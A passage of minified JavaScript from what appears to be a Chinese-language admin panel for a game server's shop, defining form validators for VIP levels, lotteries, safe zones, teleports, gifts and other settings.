t.vip.levelExpireDays||t.vip.levelExpireDays<0)&&a.contents.push("会员有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的会员等级")),!0===t.check.military&&(e.militaryLevelList&&e.militaryLevelList.length&&void 0!==e.militaryLevelList.find((function(e){return e.levelId===t.military.militaryLevelId}))?("number"!=typeof t.military.militaryLevelExpireDays||t.military.militaryLevelExpireDays<0)&&a.contents.push("军衔有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的军衔等级")),!0===t.check.sets){var n=[];0===t.sets.length&&n.push("不能没有套餐"),t.sets.forEach((function(e,t){var i;"number"==typeof e.itemId&&e.itemId>0&&(null===(i=e.itemName)||void 0===i?void 0:i.length)>0||n.push("请选择第".concat(t+1,"个套餐")),"number"==typeof e.number&&e.number>0||n.push("第".concat(t+1,"个套餐数量必须大于0"))})),n.length>0&&a.contents.push(n.join("; "))}a.contents.length&&r.push(a)})),r.length?(e.$message.warning(r.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确配置仅充值购买套餐"))):a()}else a()}catch(e){console.error(e)}}}],EnableInnerMode:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableInnerModeSimpleSignup:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],InnerModeConfigs:[{required:!0,trigger:"change",message:"请输入正确的内置商城配置(功能，中英文前缀不能为空或重复)",validator:function(t,i,a){if(void 0!==i.find((function(e){var t,i,a;return!((null==e||null===(t=e.function)||void 0===t?void 0:t.length)>0&&(null==e||null===(i=e.keywordCn)||void 0===i?void 0:i.length)>0&&(null==e||null===(a=e.keywordEn)||void 0===a?void 0:a.length)>0)})))e.$message.warning("每一行都所有项目都不能为空"),a(new Error("请输入正确的内置商城配置(功能，中英文前缀不能为空或重复)"));else{var n=[].concat(Object(C.a)(i.map((function(e){return e.keywordCn}))),Object(C.a)(i.map((function(e){return e.keywordEn}))));new Set(n).size!==n.length?(e.$message.warning("每一行都中英前缀文案都不呢个重复"),a(new Error("请输入正确的内置商城配置(功能，中英文前缀不能为空或重复)"))):a()}}}],InnerModeShortCutConfigs:[{required:!0,trigger:"change",message:"请正确输入内置商城快捷指令（快捷方式和源指令都不能为空）",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){var t,i;return!(null!=e&&null!==(t=e.shortcut)&&void 0!==t&&t.length&&null!=e&&null!==(i=e.original)&&void 0!==i&&i.length)}))?i():i(new Error("请正确输入内置商城快捷指令（快捷方式和源指令都不能为空）"))}}],InnerModeDiyFaqConfigs:[{required:!0,trigger:"change",message:"请正确输入内置商城自定义问答（问题和答案的每一行都不能为空，请删除空行）",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){var t,i,a;return!(null!=e&&null!==(t=e.ask)&&void 0!==t&&t.length&&null!=e&&null!==(i=e.answers)&&void 0!==i&&i.length&&void 0===(null==e||null===(a=e.answers)||void 0===a?void 0:a.find((function(e){return!(null!=e&&e.length)}))))}))?i():i(new Error("请正确输入内置商城自定义问答（问题和答案的每一行都不能为空，请删除空行）"))}}],ThirdPartyRobotUidConfigs:[{required:!0,trigger:"change",message:"请输入第三方对用户的身份映射(KEY不能重复，数据类型不能为空)",validator:function(e,t,i){t&&t.length&&void 0!==t.find((function(e){return!(e.key&&e.type)}))?i(new Error("请输入第三方对用户的身份映射(KEY不能重复，数据类型不能为空)")):i()}}],ThirdPartyRobotAuthConfigs:[{required:!0,trigger:"change",message:"请输入第三方鉴权token",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入第三方鉴权token"))}}],UserCheckInPrize:[{required:!0,trigger:"change",message:"请输入商城每日签到奖励",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入商城每日签到奖励"))}}],FamesPrice:[{required:!0,trigger:"change",message:"请输入兑换声望所需美金",validator:function(e,t,i){"number"==typeof t&&t>0?i():i(new Error("请输入兑换声望所需美金"))}}],TransitionFeePercent:[{required:!0,trigger:"change",message:"请输入转账手续费(百分比0 - 100)",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100?i():i(new Error("请输入转账手续费(百分比0 - 100)"))}}],EnableKill2LoginDollars:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableSafeZoneKillPunish:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],SafeAreaKillPunishmentMode:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"number"==typeof t?i():i(new Error("请选择"))}}],KillerReward:[{required:!0,trigger:"change",message:"请输入击杀奖励",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入击杀奖励"))}}],VictimPunishment:[{required:!0,trigger:"change",message:"请输入被击杀惩罚",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入被击杀惩罚"))}}],MinRewardOnlineTime:[{required:!0,trigger:"change",message:"请输入最小登录奖励时间",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入最小登录奖励时间"))}}],OnlineRewardPerMinute:[{required:!0,trigger:"change",message:"请输入在线奖励",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入在线奖励"))}}],EnableSignupAutoDollars:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],SignupAutoDollars:[{required:!0,trigger:"change",message:"请输入注册商城自动送的美金数量",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入注册商城自动送的美金数量"))}}],MaxOnlineReward:[{required:!0,trigger:"change",message:"请输入每日在线奖励上限制",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入每日在线奖励上限制"))}}],GetPrizePrice:[{required:!0,trigger:"change",message:"请输入抽奖所需美金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入抽奖所需美金"))}}],GetPrizePrice10:[{required:!0,trigger:"change",message:"请输入美金十连抽(单次)所需美金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入美金十连抽(单次)所需美金"))}}],MessagePricePerLine:[{required:!0,trigger:"change",message:"请输入每行消息所需美金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入每行消息所需美金"))}}],TeamMaxMembers:[{required:!0,trigger:"change",message:"请输入小队最大人数",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入小队最大人数"))}}],EnableTransferGameDollarToStoreDollar:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],TransferGameDollarToStoreDollarAccountID:[{required:!0,trigger:"change",message:"请输入游戏美金转商城美金收款银行卡号",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入游戏美金转商城美金收款银行卡号"))}}],TransferGameDollarToStoreDollarPercent:[{required:!0,trigger:"change",message:"请输入游戏美金转商城美金比例(1商城美金=X游戏美金)",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入游戏美金转商城美金比例(1商城美金=X游戏美金)"))}}],EnableStarterPlayerWelcome:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableTeleportStarterPlayerToTargetPlace:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],TeleportStarterPlayerToTargetPlaceLocation:[{required:!0,trigger:"change",message:"请输入坐标",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入坐标"))}}],TeleportStarterPlayerToTargetPlaceDelay:[{required:!0,trigger:"change",message:"请输入新人入服传送延迟",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入新人入服传送延迟"))}}],EnableVehicleEnsurance:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],VehicleEnsuranceConfigs:[{required:!0,trigger:"change",message:"请输入载具保险配置(名称不能重复，反悔期/有效期描述不能为空，反悔期要大于0，有效期、购买金额和赔付金额均要大于1)",validator:function(e,t,i){t&&t.length&&void 0!==t.find((function(e){return!(e.name&&e.activeMinutesDescription&&e.expireMinutesDescription&&e.activeMinutes>=0&&e.expireMinutes>=1&&e.price>=1&&e.benifit>=1&&e.limitedItemIds instanceof Array)}))?i(new Error("请输入载具保险配置(名称不能重复，有效期描述不能为空，反悔期/反悔期要大于0，有效期、购买金额和赔付金额均要大于1)")):(console.log("pass"),i())}}],HotPointTeleportPoint:[{required:!0,trigger:"change",message:"请输入热点区域传送坐标(名称不能重复，坐标为三个数字，以空格隔开)",validator:function(e,t,i){console.log("HotPointTeleportPoint",t,!(t&&t.length)||void 0===t.find((function(e){return!(e.name&&2===e.location.length&&3===e.location[0].split(" ").length&&void 0===e.location[0].split(" ").find((function(e){return isNaN(parseFloat(e))}))&&3===e.location[1].split(" ").length&&void 0===e.location[1].split(" ").find((function(e){return isNaN(parseFloat(e))})))}))),t&&t.length&&void 0!==t.find((function(e){return!(e.name&&2===e.location.length&&3===e.location[0].split(" ").length&&void 0===e.location[0].split(" ").find((function(e){return isNaN(parseFloat(e))}))&&3===e.location[1].split(" ").length&&void 0===e.location[1].split(" ").find((function(e){return isNaN(parseFloat(e))})))}))?i(new Error("请输入热点区域传送坐标(名称不能重复，坐标为三个数字，以空格隔开)")):(console.log("pass"),i())}}],UserMonitorsConfig:[{required:!0,trigger:"change",message:"请正确填写闭路电视配置",validator:function(t,i,a){if(i){var n=[];i.robots.forEach((function(e,t){if(!(e.name&&e.name.length&&e.url&&e.url.length)){var i={line:t+1,contents:[]};e.name&&e.name.length?e.url&&e.url.length||i.contents.push("直播间URL不能为空"):i.contents.push("机器人名称不能为空"),n.push(i)}})),i.locations.forEach((function(e,t){var i={line:t+1,contents:[]};e.description&&e.description.length&&e.locations&&e.locations.length||(e.description&&e.description.length?e.locations&&e.locations.length||i.contents.push("监控位置不能为空"):i.contents.push("监控位置描述不能为空"),n.push(i)),3===e.locations.split(" ").length&&void 0===e.locations.split(" ").find((function(e){return isNaN(parseFloat(e))}))||(i.contents.push("请输入监控位置坐标(名称不能重复，坐标为三个数字，以空格隔开)"),n.push(i)),e.configs.purchaseLimitOn&&e.configs.time&&e.configs.each&&e.configs.each.length||!e.configs.purchaseLimitOn||(i.contents.push("启用购买限制时限制周期不能为空"),n.push(i))})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写闭路电视配置"))):a()}else a()}}],HotZoneTeleportFreeTimes:[{required:!0,trigger:"change",message:"请输入每个用户免费的热点区域传送次数",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入每个用户免费的热点区域传送次数"))}}],EnableRandomPrizeDollarPurchase:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],StoreLuckyPrizeControl:[{required:!0,trigger:"change",message:"请输入抽奖奖池，用逗号隔开的数字(0 - 7)",validator:function(e,t,i){if(t&&t.length){try{void 0===t.split(",").find((function(e){return!(D(e)&&/^(0|[1-9][0-9]*)$/.test(e)&&e>=0&&e<=7)}))?i():i(new Error("请输入抽奖奖池，用逗号隔开的数字(0 - 7)"))}catch(e){i(new Error("请输入抽奖奖池，用逗号隔开的数字(0 - 7)"))}i()}else t?i(new Error("请输入抽奖奖池，用逗号隔开的数字(0 - 7)")):i()}}],EnableWelcomePackBuy:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableWelcomeDidiVehicleBuy:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableMapSelectLocation:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableTeamTeleport:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableSquadGather:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableUserLocationBuy:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableGameSetFakeName:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnablePurchaseMultiItem:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableQueuePurchase:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableVipPriority:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableRealtimeKillRecord:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableRealtimeChatMessageRecord:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableRealtimeAdminCommandRecord:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableRealtimeViolationsRecordRecord:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableShowKillMap:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableUserMonitors:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnablePurcahseAddMembershipPoints:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableNonVipGainPurchasePoint:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableCharge:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableLoginSetEveryday:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableNDayGift:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableLottery:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableAchieveGift:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableFamePurchase:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableGameMessage:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableGetPrize:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableTransition:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableTeleportPlayerToEquipedTrap:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableAutoFetchVehicleIdList:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableAutoFetchPlayerLocationList:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],PurchaseSafeZonePricePerM2:[{required:!0,trigger:"change",message:"请输入每平方米安全区域5分钟价格",validator:function(e,t,i){t>=0?i():i(new Error("请输入每平方米安全区域5分钟价格"))}}],ServerSafeZones:[{required:!0,trigger:"change",message:"请输入安全区列表",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){var i,a,r,o,s,l;if(!("circle"===(null==e?void 0:e.zoneType)&&"number"==typeof(null==e||null===(i=e.centerXY)||void 0===i?void 0:i.x)&&"number"==typeof(null==e||null===(a=e.centerXY)||void 0===a?void 0:a.y)&&"number"==typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)>=0||"rectangle"===(null==e?void 0:e.zoneType)&&"number"==typeof(null==e||null===(r=e.fromXY)||void 0===r?void 0:r.x)&&"number"==typeof(null==e||null===(o=e.fromXY)||void 0===o?void 0:o.y)&&"number"==typeof(null==e||null===(s=e.toXY)||void 0===s?void 0:s.x)&&"number"==typeof(null==e||null===(l=e.toXY)||void 0===l?void 0:l.y))){var c,d,u,p,m,g,h={line:t+1,contents:[]};if("circle"===(null==e?void 0:e.zoneType))"number"==typeof(null==e||null===(c=e.centerXY)||void 0===c?void 0:c.x)&&"number"==typeof(null==e||null===(d=e.centerXY)||void 0===d?void 0:d.y)||h.contents.push("X,Y坐标应为合法数字"),"number"!=typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)<0&&h.contents.push("半径应为大于等于0的数字");if("rectangle"===(null==e?void 0:e.zoneType))"number"==typeof(null==e||null===(u=e.fromXY)||void 0===u?void 0:u.x)&&"number"==typeof(null==e||null===(p=e.fromXY)||void 0===p?void 0:p.y)&&"number"==typeof(null==e||null===(m=e.toXY)||void 0===m?void 0:m.x)&&"number"==typeof(null==e||null===(g=e.toXY)||void 0===g?void 0:g.y)||h.contents.push("X,Y坐标应为合法数字");n.push(h)}})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"项：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写安全区配置"))):a()}else a()}}],LoginSetClaimCDType:[{required:!0,trigger:"change",message:"请选择计算方式",validator:function(e,t,i){"0am"===t||"24h"===t?i():i(new Error("请选择计算方式"))}}],CheckInCDType:[{required:!0,trigger:"change",message:"请选择计算方式",validator:function(e,t,i){"0am"===t||"24h"===t?i():i(new Error("请选择计算方式"))}}],DiDiVehicleCDType:[{required:!0,trigger:"change",message:"请选择计算方式",validator:function(e,t,i){"0am"===t||"24h"===t?i():i(new Error("请选择计算方式"))}}],StoreRandomPrizePool:[{required:!0,trigger:"change",message:"物品抽奖奖池的奖品名称，商品发放时机和生成命令不能为空",validator:function(t,i,a){if(i&&i.length){var n=0,r=[];i.forEach((function(e,t){if(n+=e.rate,!(e.prizeName&&e.prizeName.length&&e.commands&&e.commands.length)){var i={line:t+1,contents:[]};e.prizeName&&e.prizeName.length?e.sendType&&e.sendType.length?"boolean"!=typeof e.isTeleport?i.contents.push("奖品发放方式不能为空"):!1!==e.isTeleport||e.noTeleportMode.length?"boolean"!=typeof e.isNoPrize?i.contents.push("中奖状态不能为空"):"number"==typeof e.rate&&e.rate>=0&&e.rate<=100?i.contents.push("生成命令不能为空"):i.contents.push("中奖概率必须>=0 且 <= 100"):i.contents.push("奖品发放方式为隔空时刷货格式不能为空"):i.contents.push("奖品发放时机不能为空"):i.contents.push("奖品名称不能为空"),r.push(i)}})),100!==Number(n.toFixed(2))&&(console.log("error rate",n),r.push({line:"<所有>",contents:["概率相加必须为100%"]})),r.length?(e.$message.warning(r.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("物品抽奖奖池的奖品名称和生成命令不能为空"))):a()}else a()}}],NDayGiftConfig:[{required:!0,trigger:"change",message:"签到礼包的名称和生成命令不能为空",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(t,i){var a={line:i+1,contents:[]};t.name&&t.name.length||a.contents.push("签到礼包名称不能为空"),"command"===t.configType?t.sendType&&t.sendType.length?"boolean"!=typeof t.isTeleport?a.contents.push("签到礼包发放方式不能为空"):!1!==t.isTeleport||t.noTeleportMode.length?t.commands&&t.commands.length||a.contents.push("生成命令不能为空"):a.contents.push("签到礼包发放方式为隔空时刷货格式不能为空"):a.contents.push("签到礼包发放时机不能为空"):"dollar"===t.configType?("number"!=typeof t.dollar||t.dollar<0)&&a.contents.push("赠送美金不能为空且应≥0"):"vip"===t.configType?e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===t.level}))?("number"!=typeof t.levelExpireDays||t.levelExpireDays<0)&&a.contents.push("会员有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的会员等级"):"military"===t.configType&&(e.militaryLevelList&&e.militaryLevelList.length&&void 0!==e.militaryLevelList.find((function(e){return e.levelId===t.militaryLevelId}))?("number"!=typeof t.militaryLevelExpireDays||t.militaryLevelExpireDays<0)&&a.contents.push("军衔有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的军衔等级")),a.contents.length&&n.push(a)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确配置签到礼包"))):a()}else a()}}],NDayGiftFeeConfigs:[{required:!0,trigger:"change",message:"请正确配置高级签到礼包",validator:function(t,i,a){if(i&&i.length){var n=[];e.hasDuplicateLevel(i)&&n.push({line:"all",contents:["等级不能重复"]}),i.forEach((function(t,i){var a={line:i+1,contents:[]};t.configs.length||a.contents.push("礼包配置不能为空"),"number"!=typeof t.level&&a.contents.push("适用等级不能为空"),t.configs.forEach((function(t,i){var n={line:i,contents:[]};t.name&&t.name.length||n.contents.push("签到礼包名称不能为空"),"command"===t.configType?t.sendType&&t.sendType.length?"boolean"!=typeof t.isTeleport?n.contents.push("签到礼包发放方式不能为空"):!1!==t.isTeleport||t.noTeleportMode.length?t.commands&&t.commands.length||n.contents.push("生成命令不能为空"):n.contents.push("签到礼包发放方式为隔空时刷货格式不能为空"):n.contents.push("签到礼包发放时机不能为空"):"dollar"===t.configType?("number"!=typeof t.dollar||t.dollar<0)&&n.contents.push("赠送美金不能为空且应≥0"):"vip"===t.configType?e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===t.level}))?("number"!=typeof t.levelExpireDays||t.levelExpireDays<0)&&n.contents.push("会员有效天数不能为空且应≥0(等于0视为永久有效)"):n.contents.push("请选择存在的会员等级"):"military"===t.configType&&(e.militaryLevelList&&e.militaryLevelList.length&&void 0!==e.militaryLevelList.find((function(e){return e.levelId===t.militaryLevelId}))?("number"!=typeof t.militaryLevelExpireDays||t.militaryLevelExpireDays<0)&&n.contents.push("军衔有效天数不能为空且应≥0(等于0视为永久有效)"):n.contents.push("请选择存在的军衔等级")),n.contents.length&&a.contents.push(n)})),a.contents.length&&n.push(a)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"项：\n").concat(e.contents.map((function(e){return"string"==typeof e?e:"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n"))})).join("\n")),a(new Error("请正确配置高级签到礼包"))):a()}else a()}}],LotteryConfigs:[{required:!0,trigger:"change",message:"彩票的名称和必要信息不能为空",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){var i={line:t+1,contents:[]};if(e.lotteryName&&e.lotteryName.length||i.contents.push("彩票名称不能为空"),e.drawType&&e.drawType.length||i.contents.push("彩票开奖类型不能为空"),"loot"!==e.drawType||e.lootCycle&&e.lootCycle.length||i.contents.push("固定间隔开奖模式下间隔类型不能为空"),"once"!==e.drawType||void 0!==e.drawDate&&null!==e.drawDate||i.contents.push("指定日期开奖模式下开奖日期不能为空"),("number"!=typeof e.singlePrice||e.singlePrice<0)&&i.contents.push("单注价格不能为空且应≥0"),("number"!=typeof e.initPool||e.initPool<0)&&i.contents.push("初始奖池不能为空且应≥0"),("number"!=typeof e.taxPercent||e.taxPercent<0||e.taxPercent>100)&&i.contents.push("偶然所得税不能为空且应在[0,100]之间"),e.ruleType&&e.ruleType.length||i.contents.push("彩票类型不能为空"),"guess"===e.ruleType){var a=0;e.grades.filter((function(e){return"guess"===e.ruleType})).forEach((function(t,n){("number"!=typeof t.point||t.point<0)&&i.contents.push("第".concat(n+1,"个奖项猜中数字个数不能为空且应≥0")),!0!==t.isNoPrize&&("number"!=typeof t.totalBonusRate||t.totalBonusRate<0||e.totalBonusRate>100)?i.contents.push("第".concat(n+1,"个奖项总奖池占比不能为空且应≥0")):!0!==t.isNoPrize&&(a+=t.totalBonusRate)})),console.log(a),100!==a&&i.contents.push("总奖池占比加起来应等于100")}else if("normal"===e.ruleType){var r=0,o=0;e.grades.filter((function(e){return"normal"===e.ruleType})).forEach((function(t,a){e.lotteryName&&e.lotteryName.length||i.contents.push("第".concat(a+1,"个奖项名称不能为空")),("number"!=typeof t.totalBonusRate||t.totalBonusRate<0||e.totalBonusRate>100)&&i.contents.push("第".concat(a+1,"个奖项总奖池占比不能为空且应≥0")),("number"!=typeof t.winRate||t.winRate<0||e.winRate>100)&&i.contents.push("第".concat(a+1,"个奖项中奖率不能为空且应≥0")),r+=t.totalBonusRate,o+=t.winRate})),100!==r&&i.contents.push("总奖池占比加起来应等于100"),100!==o&&i.contents.push("总中奖率加起来应等于100")}i.contents.length&&n.push(i)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确配置彩票"))):a()}else a()}}],AchieveGiftConfigs:[{required:!0,trigger:"change",message:"成就礼包的名称和生成命令不能为空",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(t,i){var a={line:i+1,contents:[]};"number"==typeof t.id&&t.id>0||a.contents.push("成就礼包ID不能为空且应大于0"),t.name&&t.name.length||a.contents.push("成就礼包名称不能为空"),t.type&&t.type.length||a.contents.push("成就类型不能为空"),"number"==typeof t.value&&t.value>0||a.contents.push("成就数值不能为空且应大于0"),"lockPickTime"!==t.type&&"lockPickUsedTime"!==t.type&&"defusalTime"!==t.type&&"defusalUsedTime"!==t.type||t.lockType&&t.lockType.length||a.contents.push("成就类型和开锁/剪线相关时，难度不能为空"),t.each&&t.each.length||a.contents.push("成就领取周期不能为空"),"command"===t.configType?"boolean"!=typeof t.isTeleport?a.contents.push("成就礼包发放方式不能为空"):!1!==t.isTeleport||t.noTeleportMode.length?t.commands&&t.commands.length||a.contents.push("生成命令不能为空"):a.contents.push("成就礼包发放方式为隔空时刷货格式不能为空"):"dollar"===t.configType?("number"!=typeof t.dollar||t.dollar<0)&&a.contents.push("赠送美金不能为空且应≥0"):"vip"===t.configType?e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===t.level}))?("number"!=typeof t.levelExpireDays||t.levelExpireDays<0)&&a.contents.push("会员有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的会员等级"):"military"===t.configType&&(e.militaryLevelList&&e.militaryLevelList.length&&void 0!==e.militaryLevelList.find((function(e){return e.levelId===t.militaryLevelId}))?("number"!=typeof t.militaryLevelExpireDays||t.militaryLevelExpireDays<0)&&a.contents.push("军衔有效天数不能为空且应≥0(等于0视为永久有效)"):a.contents.push("请选择存在的军衔等级")),a.contents.length&&n.push(a)})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"行：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确配置签到礼包"))):a()}else a()}}],BuyArtifactRightMonitor:[{required:!0,trigger:"change",message:"建家权限防滥用监控列表的Steam ID和时间范围不能为空",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){if(!(/^\d{17}$/.test(e.steamId)&&e.timestampStart&&e.timestampEnd)){var i={line:t+1,contents:[]};/^\d{17}$/.test(e.steamId)||i.contents.push("Steam ID应为17位数字"),e.timestampStart&&e.timestampEnd||i.contents.push("时间范围不能为空"),n.push(i)}})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"项：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("建家权限防滥用监控列表的Steam ID和时间范围不能为空"))):a()}else a()}}],EnableAllBuy:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableLocationExpose:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],LHDConfigs:[{required:!0,trigger:"change",message:"请正确输入比大小配置",validator:function(t,i,a){var n=[];"number"==typeof i.minPrice&&i.minPrice>=0||n.push("最低打赌美金必须≥0"),"number"==typeof i.dragonWinMultiples&&i.dragonWinMultiples>=0||n.push("猜中龙奖金倍率必须≥0"),"number"==typeof i.tigerWinMultiples&&i.tigerWinMultiples>=0||n.push("猜中虎奖金倍率必须≥0"),"number"==typeof i.leopardWinMultiples&&i.leopardWinMultiples>=0||n.push("猜中豹奖金倍率必须≥0"),"number"==typeof i.equalWinMultiples&&i.equalWinMultiples>=0||n.push("猜中和奖金倍率必须≥0"),"number"==typeof i.equalDeductMultiples&&i.equalDeductMultiples>=0||n.push("和局返还倍率必须≥0"),n.length?(e.$message.warning(n.map((function(e,t){return"第".concat(t+1,"项：").concat(e)})).join("，\n")),a(new Error("请正确输入比大小配置"))):a()}}],MilitaryLevelConfigs:[{required:!0,trigger:"change",message:"请正确填写军衔等级配置",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){var 